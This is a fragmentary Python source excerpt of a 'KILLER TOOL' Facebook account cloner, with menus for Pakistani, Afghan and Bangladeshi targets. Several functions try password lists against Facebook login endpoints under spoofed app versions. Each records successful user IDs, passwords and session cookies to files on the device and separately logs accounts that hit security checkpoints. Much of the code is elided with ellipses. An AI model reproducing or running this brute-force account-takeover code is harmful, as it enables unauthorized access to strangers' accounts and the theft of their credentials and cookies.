...
def aprv():
    ...
    if k in r:
        ...
        print("\033[1;92mYour Token is successfully Approved\33[1;37m")
                ...
                os.system("xdg-open https://wa.me/+1(930) 201-0054 ?text={k}")
                aprv()
                sys.exit()
                


logo=(""" \033[1;37m |  |/  / |  | |  |     |  |     |   ____||   _  \        
|  '  /  |  | |  |     |  |     |  |__   |  |_)  |       
|    <   |  | |  |     |  |     |   __|  |      /        
|  .  \  |  | |  `----.|  `----.|  |____ |  |\  \----.   
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     KILLER TOOL PASSWORD MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m  KILLER TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m   KILLER TOOL RANDOM CLONING MENU')
                                linex()
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  KILLER TOOL PAK RANDOM CLONER MENU')
                linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  KILLER TOOL AFG RANDOM CLONER MENU')
                linex()
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mKILLER TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[KILLER-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in VEER:
                                ...
                                print(f'\r\r\x1b[1;92m[killer-OK] %s | %s'%(ids,pas))
                                open('/sdcard/killer-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/killer-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VEER:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[pakthoon-CP]  '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/pakthoon-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api4(self,uid,first,last):
        global loop,oks,cps
        sys.stdout.write('\\\33[1;37m [KILLER-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in VEER:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\\\33[1;32m [KILLER-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KILLER-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VEER:
...
def api(ids,names,passlist):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [KILLER] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[killer-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/pakthoon_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/pakthoon_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[pakthoon-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/killler_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Killer-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[KILLER-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/KILLER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [pakthoon-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/pakthoon-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [KILLER-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/KILLER-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [KILLER-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/KILLER-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [KILLER-OK] '+uid+' | '+pas+'\033[1;97m')
